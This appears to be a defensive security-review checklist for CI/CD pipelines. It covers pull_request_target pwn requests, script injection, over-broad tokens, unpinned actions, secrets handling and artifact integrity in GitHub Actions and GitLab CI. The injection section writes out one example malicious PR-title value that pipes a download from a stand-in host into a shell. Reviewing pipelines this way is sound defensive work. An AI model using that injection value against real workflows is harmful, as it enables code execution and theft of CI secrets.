# CI/CD — infra misconfig checklist

Covers GitHub Actions (primary), GitLab CI, and CI principles that generalize. CI is a
top-tier supply-chain target: a compromised workflow can leak every secret, tamper build
artifacts, and ship malware downstream to every consumer. Treat confirmed findings here as
**CRITICAL/HIGH** — this is where real 2025–2026 breaches happened (tj-actions/changed-files
secret exfil, Nx "s1ngularity", Shai Hulud v2 worm, GhostAction; Microsoft symphony
CVE-2025-61671, CVSS 9.3). Static helpers: `zizmor`, `actionlint`, `octoscan`.

The governing principle behind every item: **untrusted code/input and privileged credentials
must never share an execution context.**

## 1. Dangerous triggers + untrusted checkout (the pwn request — #1)

- **`pull_request_target` or `workflow_run` that checks out / builds / runs the PR head.**
  These triggers run with the *base* repo's `GITHUB_TOKEN` and secrets, but
  `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` (or `head.ref`)
  pulls the attacker's fork code into that privileged context → arbitrary code execution,
  secret exfiltration, repo takeover. This is the pwn request. **Flag any
  `pull_request_target`/`workflow_run` job that checks out or executes PR-head code.**
- Safe pattern: build/test untrusted code under the plain `pull_request` trigger (no secrets,
  no write token), upload results as artifacts, and let a separate privileged `workflow_run`
  job consume only that safe metadata — never the code.
- Note the Dec 2025 GitHub change anchors `pull_request_target` to default-branch workflow
  definitions, but the checkout-and-run-PR-head anti-pattern is still the thing to catch.

## 2. Expression / script injection (S3 in YAML)

- **`${{ github.event.* }}` interpolated directly into a `run:` block.** PR title, body,
  branch name, commit message, issue comment are attacker-controlled. A `run: echo "${{
  github.event.pull_request.title }}"` lets a title of `"; curl evil|sh #` inject shell
  (38% of orgs have this class per recent surveys). Safe: pass the value via an `env:` var
  and reference `"$TITLE"` (quoted) in the script, so it's data not code; or validate against
  an allowlist.
- Same for GitLab CI: untrusted variables expanded into `script:` lines.

## 3. Over-permissive token

- **Default `GITHUB_TOKEN` is write-scoped.** No top-level `permissions:` block, or
  `permissions: write-all`, gives every job more than it needs → a compromised step can push
  code/packages. Set `permissions: { contents: read }` at the top, escalate per-job only
  where required. `id-token: write` (OIDC) only on the specific publish job, never globally.

## 4. Unpinned / mutable dependencies (supply chain)

- **Third-party actions pinned to a tag or branch** (`uses: foo/bar@v3` / `@main`) instead of
  a full commit SHA. Tags are mutable — the tj-actions/changed-files compromise rewrote a tag
  and exfiltrated secrets from thousands of repos. Flag tag/branch pins on third-party
  actions; require `@<40-char-sha>` (plus a version comment). First-party/official actions are
  lower risk but the same principle applies.
- Curl-pipe-to-shell or `npm install` of unpinned/un-lockfiled deps inside a privileged job.
- Self-hosted runners on public repos that accept fork PRs (persistent compromise of the
  runner host).

## 5. Secrets handling

- Secrets echoed, written to logs, or passed on a command line (visible in `set -x` / process
  list). Secrets available to a job that doesn't need them (scope per-job/environment).
- Secrets reachable from a fork-PR context (they shouldn't be — confirm the trigger).
- Hardcoded credentials in the workflow YAML itself, or in committed `.env`/config the
  workflow reads.

## 6. Build & artifact integrity

- No provenance/attestation on published artifacts; artifacts built in the same job that has
  publish credentials and also runs untrusted code. Cache poisoning: privileged and
  untrusted workflows sharing a cache key.
- Deploy/publish steps with no environment protection rule or required reviewer on the
  production environment.

## GitLab CI specifics

- `rules:`/`only:` that run privileged jobs on merge requests from forks; protected variables
  exposed to unprotected branches; `CI_JOB_TOKEN` scope too broad; Docker-in-Docker with a
  privileged runner; `.gitlab-ci.yml` `include:` of a remote, mutable, unpinned template.

## What "safe" looks like (the receipts to expect)

- Untrusted code only ever runs in an unprivileged `pull_request` context.
- Top-level `permissions: contents: read`; per-job escalation; OIDC scoped to one job.
- Every third-party action pinned to a SHA; a lockfile + pinned installs in privileged jobs.
- Secrets injected via masked env at the narrowest scope, never logged or in argv.
- Production deploys gated by an environment with required reviewers.

Cross-refs: shell injection details → `checklists/lang/shell.md`; added/bumped deps →
`checklists/supply-chain.md`; the YAML's own `run:` scripts review under the Shell module.
